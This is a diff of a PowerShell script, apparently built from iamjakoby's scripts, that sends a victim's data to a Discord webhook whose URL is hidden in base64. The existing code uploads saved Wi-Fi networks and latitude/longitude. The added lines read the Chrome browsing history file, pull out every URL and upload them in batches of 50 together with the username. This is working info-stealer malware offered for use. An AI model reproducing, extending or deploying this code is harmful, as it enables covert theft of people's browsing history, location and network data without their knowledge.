@@ -2,6 +2,7 @@
 #so, here is plan, convert to base 64 then unencode to use it
 #gotta add new inputs for the upload discord function
 #using a combination of iamjakoby's scripts, but i stripped some of them down myself, powershell is now fun.
+#very much needs to be optimised, im slowly getting there
 
 
 Function Get-Networks {
@@ -124,3 +125,33 @@ $link = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64Stri
 Upload-Discord -text $Networks -hook $link
 Upload-Discord -text $Lat -hook $link
 Upload-Discord -text $Lon -hook $link
+
+$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+$array = New-Object Collections.Generic.List[String]
+$counter = 0
+Upload-Discord -text $env:UserName -hook $link
+Upload-Discord -text $Browser -hook $link
+Upload-Discord -text $DataType -hook $link
+$Value | ForEach-Object {
+	$counter += 1
+	$Key = $_
+	if ($Key -match $Search){
+		$array.Add($_)
+		New-Object -TypeName PSObject -Property @{
+			User = $env:UserName
+			Browser = $Browser
+			DataType = $DataType
+			Data = $_
+		}
+		if ($counter -eq 50){
+			$counter = 0
+			Upload-Discord -text $array -hook $link
+			$array = New-Object Collections.Generic.List[String]
+		}
+		
+	
+	}
+	
+}
